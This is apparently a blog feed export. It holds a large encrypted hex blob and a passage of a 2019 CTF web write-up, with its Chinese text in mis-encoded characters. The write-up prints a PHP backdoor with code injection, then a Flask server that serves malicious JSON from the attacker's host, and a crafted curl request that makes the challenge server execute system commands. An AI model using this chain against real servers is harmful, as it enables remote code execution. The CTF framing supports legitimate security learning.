1bda910feec7026f1d1d6961162a0def5ef6557cdaa6a8accc260c1de92ce6dc691104eb3dd00fc050e7811f048c2ba34592b19c1f97422c5ed3125c62b9738f5348ca817bd9029db58c621280dac794c4b9224ef0277c07b3accec2771164fe7914ebbec084157f03ea549f27a476dd1c2d421abfd01df22e15c36423a8c38787c0aeee4056b4ce9a3ddc2f3f2315afe22fcc8455f7479ca96682c7746b0a5695ebac0842bb078dfba88c5f008182d3e25bcb23c6eef4f372f741949a95cec9ce10edd282e97a670d09cda8fb409ded39fa26b7f8680620dfafcd442b4d479361f3cef0a6847263185040547d51e22188a65c22ca9e85544d9f7ff1389930a596c02db906f0dfba4adab84c1d399d82fd4f8e1c9aa312da44570afd42c8c95948b4750a34bc4472bf0784f42710401a48dcdb09be789751d44825807487a33f62dfe47f684f490ff94046199879823b0347ce8fc9694887481593b01ff7825d8574899b527afcfe9a0232be40f993829a450b61798570efa2e0fead063fc62d5aa6047a0d36e5e4e1021dfaf0c9738a0325319d720c2632ef3d061a362f8a8c2029fe17bf07fbdbfcd5efd5a0149544714570422e1e1816bc1df3ec26b5e1c08b07c035a3d312de538b34419ce25c3fde26b88960e055692e77dfb9d2950c39e45ad988fbba6b6d5d66eb8e51e9930adf51ed907dd0d6072608192bc914afca07ccf6f2a1a8fadb7cf63f67d14b6f6d22627eaf1918c851318046fb154614d14617855f76dd21ddf8c9682e033aaa02be8178d2a1495f713257c6ff77d4a5d0f08b5840e90f094e4153e5e3d55ba1bf56e44d65e4b23966605e7ca7899f0c613dcab7e7f984eccdc36aa5c34bd7f5bac40321f0d544296462c1223c60d297ff01c5ac347943b3289ba82cd0a72b745c65f9901479db55bba04a7ced840a21799b872c47c5be8e9b886ef129ce987e962aa6ec8c13d9dc6724fac2c2eb2d2035d58c948636aa09e91768369f93403f6c04e5265cc6a2c3d10dc4ffc90ba65bd5dd8fb47569d386e20d00bba609ded0b094b446d73869f3abf0d4b5965c79376560225ed8ca845ebafa2e7d413fafac20cc0ab5528b9409bc133bb62b994ad07faf0b83d14a7bad1aba9b4a6d3f324da1eff21c4c7603939e04ad7fcc2781d121dd5b8a509798731122133b75f938b7b9a90448fe78cf63b0c961b2c404e832186dd0e82c7f7b125c072f786d0849cd1663a346ea4795f00d02d749f1152e93719f67e749aa76a7e0a9ca8b32f5004eb2fd64d003518bd132b9825acbcd1d7c7bab0b30cea3655c876e59ebe4fbceab9b5b4f8e5baf6085207fa532964cfab8fa7323f683a42cd1eb7b339771746d824b86c801c177e76143962557f3712a7d97370c2be90f845a8a3788a50e78b7cccc6f696b2badac4d83962897112f7a40dd371f4be1b4576f119f8e08554296881c83ac19d16856d1771c8210d76adca73076f9221a426c9525ea3897246d72140541c2ed6e12d29dc310726ae6238c79d8cc0fc7b70e3a76a137879cf6d0843f55d99e8811eae90560d43ca2033886e3c729764ce384fb7cd9484c658155aaad2bed799c11addc67c558f5393517fff5b5be7b85d55a2ba11e726c8679c72022e860efed645e7fc1d6aec8b5610f25edc0eb574e20ec47c275b81dec98aafc65137eee8fb820b36462dc1d81899b94178874f56758ec8a911449643446536579e7f79094b42576f3d5b588b43fbe88818ee34f026e6d276d1ec3790a89320ab08c30e174c89fd62a46929f6098842e77008d2e9bc0c404cdf5ac77bd01e17aeb06e8af6da1a103e2803b6c6426f6b1dcffb31d9bcd4651e19a83f56d652f5673da2b8f6dadbd3af51dcba7c42e04223c76a8a5b2e7d82e5bbc1c829f632ed7c28dde7f10a31efbf3dd7c10c0f2f85471d39684f6831116e259884ea7cfbaa7a7a674aff64af26c25a56221977098b11db1f7eed966e14e70f24ad75e39d5075fbc23b9731858c53cee6c7908f148038d9e11365d1106a82487b104d7436a2acb2421d2c5c3c51807c9a6573626ed4fbc02bb3141376181e2c88b6275f5900d60b3ea321ae73ba750cd93b97950c72422bae299e485ac1ccc8dc6e29880276ffd4f98eb9c3edc68e74d3c2663a8be68820a3addf03ece11ddbb6161d0daaeaaa269df14951f9aa59ccdc1f2ccd21d9169577b78ee342287624bc782985d7981387da806115c21d7289ef86602d8c6a5c53c1112b1f6479a25548f3168cc77f4557aa0f1586e9bcb1434ca12d3d2dd99b8f3948f291a1dbfe6f301f6e7af5bfe59cc829ad4a1495912bc1ab5ebc8ca804a01118cf004a3c6227598e842fff0fff7f94a4c3d83d4f47aa1ace06929b668769076dce5cdb60e3a22705c6c97227cd35bcbb0ed7d01d0cb77195210ab1b70e402f2181d017d37bd617f4b3074433d17ced9d4a6eac4e0b476cfd0411c815ab3385b3e14161d3e7d0b4046ec53126a99d7b1d8e24ff7c7ac460a684c53786eca66a478206013b299156e7f7319de554fa7ec6093325538fd7ca2b34a4b7e370c69bb23fae5bbb352735c9b5c31562a3fc51630a1b42b79edfc8db4ef1404f1a35320abd3dcc75322108a84380713fcb23e20907b014ae7a88c77ee802d7e1945fdffb9d89ec5b4d4b169af1f951807bfc7929aa9936c91359fbff101810f3e19d87c3cc3111db3746916e10f52b5f3ca3eecd29de87d630ab63731f43fc4a3ff955394a8c4597933a8a1ac07ef3199ba504e9c6c06b9f9690acb3a76077a53db3b32e5dc8b13ced70431fc4a0056bbd6d145de8def567f5eae8270c38521ac4d77da6fe2a2ba1bbd6078d262b0dcbb563f90237d15160f5864308a9083a3d155e346cae1f2cbbecde5cb5aeb31faf1b289a4380a69277e8952835021849e44a7a42d7f0d1db9e303de0fed42df62ec34ef3f73ded395cc783e31f0a4f32de19961872302716e6b0e88d177f01263b11f46279d273f57a1760c7fad594f088fe1d7377907f81e62524ae27705971af0259be54972b59f19c166cf0038759e4f61223315695c0d9acd3ee293ae0dcffd5db70ea540dcd85e6cf82f33353342f4710ed17bdb94b7fb0e6b51b473ecffe2000f619afd362aa5eacd3b80ee8c47e918d8e0cec5e30f63f99245477e9efb8dedb26185c03029bdfd5bb2299ad1f9e8ba9e83544b07644e20b90e556e48f51a6116c925c412a710752226c025d2aec1afb652438a1dd006097066f67e914688c8ae5c9410cb9505c6ad14e0e849fba27c5b51334d220bd0e3d9a9b07338157c7093f4b1cda79b5c3536bf0fdbd4b898af12af3265d74b5896adb865a6b0c6a39ecc508a66f7bc95507609514de05a4b5c760167a3190d95ee956b9d77624f80abba673529ce97f129748aa3226ef036d55cf31c1c4398d6adcbbd033269ceaf9977716a2090166bc887a5a802b67777da627ebfaa5f14c5a010cea2d1b2d6f2c271d3e02070d172759c58d041fdbb3bfaea0a177576dada182b36a5a2060b44068fa263a89b2ffd4a6217f9ff4c5422203c50252a5dffa7839526913cd8a68dd924db511ab4bddb93befea69b4381ba9230aa4a85a7aa03a788d70702c4d7965f82ce2ccadcd9e7d2926773d4cba91b717ff1de03f8c0535efaaf518120e170df11f50acf90f4ba1cc88b78f51a6c7ac9f24b024b78894b0199961f818a100decc0899a20a4d6261f30bf2169e4ad8f70a5001d065ecc259ede507ac4e751812ca98d70edc819a7a9da2fb456387f5a6991d7a0f66b2b3e61bce845dbd3863a12877501a1b53d018dbfe04bc99f2d5edaabea2250ea9441efadc1bc188893f29dcc31dc9b3557b035a8e72e737ee0f85160c6d091fc012eb8859861cf5a07525cdc0e28242f274344523f6434d6178e0c3cd881f5b08ff5e98f8f12c0436f6a7cd945753cbf31a2fbef9f46b58ebd81073a81722e6a46815ae1823b18c1ae7e68555c4770ed3b5b3b3edf17fb22a11a70d239d815b7f870c70bc966e278168fb62b60e9701c35f24d0b693e1a278b2972fb9f2d07c5b0c3329cf28c2d127a6217cb5db869a697d6211af1d824315b11670e5552d60a171c74ff663bcfc52b2f5f6d15a8d25c338839afba95b2b13dd41a309791f4e80bb33181db30cdebd4e9dd6713b20e109d2ac71b51258a9551f7d9464ebd0eb2f9aafa5aa5a5394f60c312cc2e32a1f2f8a99875c0cf01ea6a9de736d92d3dceada2e0ae1896bc7be517361943e3cfc9e18907f9fbeaf113386a6f54625e0e0787692f2192629884be9e3adcc22d7e57b6faab34e5ca0b7372f741b6e11a09c612e6a022e8d1a1a75b12c99b951412cd78979f799594f1c1a8a52117df964725b8fe2857df21d605c5ab3032d39961688f13fa1c460bbc26c60efa921cef1c1b06179599e3e7650f687f9c6c67e20e25fba6222c36933d4813a19d20f83da7958e80b0001d293795122c3e6aa7cb21bfaf76bb860c15f0800e660e8f6f8007de0dbfb3c0b6d89680334847a72d9e5b0ddb2af8e3e8af294f72ba2737a5580dd518c35f0f281e71bbb3ee324bba897dfbd5ccbe68217ee1e9ee1b26929a0e7586f8674202ae71a1bdf47c1f14834d62d573afd5e31ef5cf01c1ba2d9ae39cc9e16b28bf39adf961b4abff39ee0b6f0680c4edf84b90d4a9d7fd1c3c30ce1fbab3680673650fb7fc6f9e2438f3c46e58e789c205761bb4bd4f7d44b91d490d6edaea5829cb7d816a2807858c68146b53b0bda710ce4be250a2c85dced456c06534ffcd29e6d119bc444573c641df86de9ae753eb5ff44f06d7e2c7ea7ffbc9c94ed919a6f11b0744b6fc2450cd0d16ca7c701687b1306aa4dc8806d098b0dafd324e2689102f59c31854f4ac1247595a0942682df1e36e0f12ef2a166aad81239f547f11ee3f643e2542e31f9bd8cc68ad792f271d2a2e0aea5b39287097586265b880d232f7c05547eae05c6680e146d45c478975e8c5d502cd7bc9a1ba2260ef66eb0924d358a02e74cc41a4c9af47d2e86ec58f400e69118a3edf09ecbdbf70d58f618fd88ba0722a4c470b0f8e45c93d8482714fc0762563e77cf5e68730d60d98dd00bc4165addd23db7d0c8fc411eeadbbfbe86e8dd4c45d1c22bb985ae4e70f0c52597f095d4b3fa7a95376d196f25c3252ab17d25da3bc529650f88223289e421b19978a2a907161d0e607fcb2462450b56c603a3c94f39000e907b348a4563b2eb1d6fb24657a925954c154ac1068e980c303eb3b63eeb5c71b2d06e49bfe0e875b7582373fe54acb0d7174866d55e23e9a45686071cbfa817d7e8fa18738515e6317eb6c39fbbdd64b277aa2664e1f0d3882fa4d141bf2554ef685cf0e6bb4431cb655aa90f461d63c3ccc55e6d9106cf2ca1c751cce15cf92700f868d5ef2afe97589ebc767db4396dc16bb4d9c1166aed962b0b58fc6b6c87fe830e47a5f1828da3fcec924aedc673d0cc2905b5afb6b1fa8edd2f2d00e8b080727ab18512d2725cd71f1bb97c59d0279c06d56f7972bb1e5a04a0e7f02817326760004578c1385ad05f36f4d12708ec2bb24c91670a94309f0754db5bf2359ad71993a775847111053b162dc9ff9d96eaa7e3cc571aab3c6b2f80a5d3810bb49e523dfe8a4c2d094f10ba66f8e7fb9a1921985b8d429fca8935c0c0fc4583d91a37b878d3b5e94500261b625757cd608ea9af0d0c2c5a718914740cfaa277c1e282d793d00ea0bd9e3adfc5b7bfabd8f6844e8c4054c051ae16e3a2228ae60f001f362897586d30b00947fba25725922782c742c21a035bc733f534aa55466c264f505d1d0fa237994aad4a44e1fcb577cec769d62de997ee2e8b5d2d664476b2fccc71dea09e253f60edfd291e016fdff50745d11a5981c97661db76c76c0589bc394851b0077abde0a09f6527f8281da212e6833b4e77af7f090630f3f336127ba81c5c33f49eea14d1f93974f3dd5ad871f95d023667b45bfe482fc3dc615422a916256734ccd9a218e589b897bdc3d085a1df2cd61263ffc23a81dbc6699019807c4fd69338812d617a253b9d05f095cc498f912006a222cf701d057d02609238fd3d5a022b076b2ccb84f607674bd2d3e68d887b18d047fcb0a8dac076a07d4877a64df56d715d7f0f594c04b1e3619758c56f6027aca599359fc9fe87d831f46be52836fe6573d88bd1f1424c8f8d79f41b645baa6f3242309556c44e78ea1d6bb6f34bfaa1453356d2d5e60bf877938a82524ec15e0dc79a33e953b4652b24078ee9f316c157460531118d78530dd2671c15305f98d7711897369c021a9642f604f93aeacbb20983adeafc55ee975f1cf51c5d067dc4426dd2f3c8c155477d93c4d98477ae3eff9ec662abd4dc9a71257ad9e744b46fc136dd9ad70a2ab3d9e6336eb6e68a073795b94ca19391d484cb0dd35246df0cfdcb105bfba55e4def9fea7fc4d1b2e37966bcc0ac762a3814296ab3d7ca7b72ea9bdc0b93d3ac25665397a6879462a29138c1d8e3f48f1d8fe7356417da7d978a144208651671cd333919ff0f3c7bd721926aa4b6e1a21cf1b69eb8da918b396829cc87e9bac36f6ff5f9e2908d4d1a50e52a8b6f0556778ff711073f70139403f98e99cc8b68c036963bbac60462e2877501418bd40c679867ca50acd840fc0d72491a73a05ced17ef68bbb4b0e0c7a6e190529808981ff596f15559961e094651dd13b5a43db073e53535f3f83280f120d41c62b6c9dc5c27d3ba49b97d3b137d1635d4b12fae748fe3c793ecaf3a9046cafb20d4e04b3c758b83e249ac60852a63eea96e8fc3d599bf78e975e1eb3f0d95c32c91e6aebf72b73634eb0824d5db7634e1af030f5bd9b882a1c027ba12174228a14aac75b83d8c09e611427601a55ad552e7a52823b553b95fbea3078d47cb3de207518b6076328cb3c8e831465311209beca53a95049b163b1ab252cf3b1209832ade28abe3da406c625876aaf728b8933d8e3d9acb2b1ab4a5c6fb742016a3f36f17a2d6d9c85c765726e9c5c307e60d0dfa88321107b74d4377ea3cbc0a5a6078db705743bb7a945885cfc62fcafbfa370d4231c916f3af4cb6347ac8ff3c90b6ae3bbd31171bb8a61b0f2ca526f96baee7a945d1802cf57ca2da1120ac4c6ca14704c6af9cffb018c283038aebcf4e4e4ad766ec0fad7c3876cef0911c83e316eb0ed2b11f27ed0925c2b4452cb30407ef3420bc86af977f4a20fe418b2b5203f1cac4ac294e4402663ec6f78443af91d78ee09c27bd93e83be18ec24c3867fec5d9f14091910b9d30003fcb921fb2a670744a5a5da1112d89d5d80753c727f1055b72b46f478b96d43ad299c8eb978aeb6132c2cb7c2b4297d488ef4063dc50fd96f2255f0dab7304a45c5aaed266afbd978b4cb02686cf87a3c6db14d8e42e7a8b011c7e108814e8b4684b22edde2d7144bde714f8a15d84d3b07622cbb85b3e1800661c9930009d03dc60ea94c8cb9d0402d29d2fdd3bfcd1f3d946a3832c72b3cf92b1efb13a4ae8687ccac4a19d03135d4889a82f4245b1999c8d0a8df05a6ac1d5256ee3205495c7fa1aebbfb3b4e513b70ffba16378007ada3f6767cd9ed36ba4d9dc63c991bc2f2ab0b8787c2808d0cfabcb877106531d2bfec653abbaa72bdd81ff7316deb30dd2f470faa67612f0fca776e17ff3f6624b0c4ca7e073f14dbcc7d052924e94f9a32ccb2509762b5531e183aa431bf4ab685a5250cd53f876784e8831bb9a0ecf49d439b2160522126d630d446693dd3ab8358811681b1155f2eb7be5b6ee3528bcff4c5b8228e1d472466ad662fd87ef1888af1a8108a719ee598eaf88d40c517f580a2dcd27b0b790ff489a1f247859c07215c71b421fd1eb04e436f6530398d099f776dcf6566907a2929501a362c630814e2ca7479ab6416e69b0a0a891ebeb3272d1b6a7b2d0084404ee19d373fabc9ee3643916cb0e72706df9f8c4314fe966576d9e18ad58f80ff56d6c9a724a70c92b16b62d07df199b9b01f9c774abc0704250f178accab78c91707286137fda23fb93e9efeb4ac99724e157bb6461bebf1955f51569755c3bd0cc49477572584278ae0eace81dc78c2ce5a7ea5b1ed04d2834fd2fa3d67882d49963d6d532ff091d0ec52723ef95a9e3c8293836afa1e94c488b2ca3e7aa56a20d193f9571da906e2227d324ffbb9d8a160aa942e03ea587009eb86a4c45b3fc4de6b3fe00e73ec1298d9b2e36d4976899614894ebcc1002cde3e4157aef982b46c6d880230dcbf1509f835256055bb058d6acbf775c2449230ce6b0ceba08385b29071feaa5a5c811447a2cd8c56daa747e11e7a1818fcf544f73039b79b3497e000b8b22b0b0fb303155aaec055f52fc6d058b91e55bb927ced8263a9af6ab572bd80804c37969845f3a85e4e9cd033eb04a69ade281c70c0f6820a81638d14ed702b9fe89ee10f1b968dfd664792ca4d61734bb5c9268e2618b6b5ee521a663ec4d548dcb3fce003c8c382eecc37c3f4f105c6d4b28cde36c95f714c4bb80e5e2ec133c2727709e5ee26102d97977da5ff8492c0071249d4359e48ffcc7242529ef8e8fa60ef4582376ebdd0b470184cde59ab9ee517630451</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      æ–‡ç« å‘è¡¨åœ¨t00lsä¸Šâ€”â€”https://www.t00ls.net/thread-53464-1-1.htmlï¼Œè¿™é‡Œåªåšå½’æ¡£ã€‚
    
    </summary>
    
      <category term="æºç å®‰å…¨" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="æºç å®‰å…¨" scheme="http://anemone.top/tags/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="Fortify" scheme="http://anemone.top/tags/Fortify/"/>
    
  </entry>
  
  <entry>
    <title>2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£å¤§èµ›ç»ƒä¹ é¢˜wp</title>
    <link href="http://anemone.top/ctf-2019%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E7%BB%83%E4%B9%A0%E9%A2%98wp/"/>
    <id>http://anemone.top/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/</id>
    <published>2019-10-17T12:38:34.000Z</published>
    <updated>2019-10-17T13:14:29.021Z</updated>
    
    <content type="html"><![CDATA[<h1 id="çˆ±ã„çª’æ¯ã€ç—›"><a href="#çˆ±ã„çª’æ¯ã€ç—›" class="headerlink" title="çˆ±ã„çª’æ¯ã€ç—›"></a>çˆ±ã„çª’æ¯ã€ç—›</h1><h2 id="0x01-è·¯å¾„éå†"><a href="#0x01-è·¯å¾„éå†" class="headerlink" title="0x01 è·¯å¾„éå†"></a>0x01 è·¯å¾„éå†</h2><p>æ‰“å¼€åœ°å€çœ‹åˆ°è·¯å¾„éå†ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571126059065.png" alt="1571126059065"></p><p>åœ¨uploadæ–‡ä»¶å¤¹ä¸‹å‘ç°åé—¨å’Œå…¶æºç </p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571141073240.png" alt="1571141073240"></p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571141089817.png" alt="1571141089817"></p><h2 id="0x02-åé—¨å®¡è®¡"><a href="#0x02-åé—¨å®¡è®¡" class="headerlink" title="0x02 åé—¨å®¡è®¡"></a>0x02 åé—¨å®¡è®¡</h2><p>æ ¼å¼åŒ–åï¼Œè¿›è¡Œä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// UAæ˜¯md5(POST['pass'])</span></span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è¿™é‡Œäº§ç”Ÿä¸€ä¸ªurl</span></span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    <span class="comment">// ä»urlè·å–æ–‡ä»¶å†…å®¹ï¼ŒSSRF</span></span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// CodeInjection, may cause RCE, e.g.,&#123;"f":"system","d":"ls"&#125;</span></span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span>.$f.$g; <span class="comment">// url=http://pass[30:35]+pass[10:20], i.e.,url&lt;=15</span></span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;<span class="comment">/*...*/</span>&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>å…¶é¦–å…ˆæ£€æŸ¥UAæ˜¯å¦ç­‰äºmd5(POST[â€˜passâ€™])ï¼Œæ¥ç€å–passå‚æ•°çš„ä¸¤éƒ¨åˆ†ï¼ˆpassé•¿åº¦è¦æ±‚å¤§äº40ï¼‰ï¼Œç»„è£…æˆä¸€ä¸ªurlï¼Œä»è¯¥urlè·å–ä¸€ä¸ªjsonï¼Œå†ä»jsonä¸­çš„få˜é‡è·å–å‡½æ•°åï¼Œdå˜é‡è·å–å‚æ•°ï¼Œå¹¶æ‰§è¡Œã€‚</p><h2 id="0x03-æ„é€ æ¶æ„json"><a href="#0x03-æ„é€ æ¶æ„json" class="headerlink" title="0x03 æ„é€ æ¶æ„json"></a>0x03 æ„é€ æ¶æ„json</h2><p>æŒ‰ä¹‹å‰åˆ†æï¼Œæœ€çœäº‹çš„æ–¹æ³•æ˜¯åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šä¸€èµ·ä¸ª80æœåŠ¡ï¼Œç„¶åè¿”å›æ¶æ„json</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,jsonify</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srv</span><span class="params">()</span>:</span></span><br><span class="line">    resp=dict(f=<span class="string">"system"</span>,d=<span class="string">"ls"</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-åé—¨åˆ©ç”¨"><a href="#0x04-åé—¨åˆ©ç”¨" class="headerlink" title="0x04 åé—¨åˆ©ç”¨"></a>0x04 åé—¨åˆ©ç”¨</h2><p>æœ€åä¸€æ­¥ï¼Œæ„é€ åé—¨è¯·æ±‚ã€‚é¦–å…ˆï¼Œå‡è®¾æˆ‘æœåŠ¡å™¨æ˜¯216.126.239.124</p><p>å…ˆç”Ÿæˆpasså‚æ•°ï¼Œç”»ä¸ªè‰å›¾å¥½å†™ä»£ç ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571317896911.png" alt="1571317896911"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: url=<span class="string">"216.126.239.124"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: _pass=<span class="string">'a'</span>*<span class="number">10</span>+url[<span class="number">5</span>:<span class="number">15</span>]+<span class="string">'b'</span>*<span class="number">10</span>+url[:<span class="number">5</span>]+<span class="string">'c'</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: _pass</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc'</span></span><br></pre></td></tr></table></figure><p>å†ç”ŸæˆUAï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [4]: import hashlib</span><br><span class="line"></span><br><span class="line">In [5]: hashlib.md5(_pass.encode(&apos;ascii&apos;)).hexdigest()</span><br><span class="line">Out[5]: &apos;98a36c28cf36c4d8eeb8055a3538562e&apos;</span><br></pre></td></tr></table></figure><p>å°è¯•å‘é€payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://114.55.36.69:8020/upload/dama.php -X POST -H &quot;User-agent: 98a36c28cf36c4d8eeb8055a3538562e&quot; -d &apos;pass=aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc&apos;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°payloadç”Ÿæ•ˆäº†ï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571144854091.png" alt="1571144854091"></p><p>æ‰¾ä¸€ä¸‹flagï¼Œéœ€è¦ä¿®æ”¹æˆ‘ä»¬æœåŠ¡å™¨ä¸Šçš„payload</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571145028036.png" alt="1571145028036"></p><p>ç„¶åæ‰¾åˆ°ç›®å½•<code>/var/www/html/flag.php</code>ï¼Œcatå¾—åˆ°flagï¼š</p><p><img src="/ctf-2019â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£ç»ƒä¹ é¢˜wp/1571145141787.png" alt="1571145141787"></p><h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><h2 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a>0x00 ä¿¡æ¯æ”¶é›†</h2><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç”¨ç»‡æ¢¦CMSå†™çš„ç½‘ç«™ï¼Œæ‹‰åˆ°æœ€ä¸‹é¢çœ‹åˆ°ç‰ˆæœ¬ç–‘ä¼¼æ˜¯v5.7sp2ï¼Œæƒ³åˆ°ç»‡æ¢¦CMSV5.7SP2åå°å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¦æƒ…è§<a href="https://www.freebuf.com/vuls/164035.html" target="_blank" 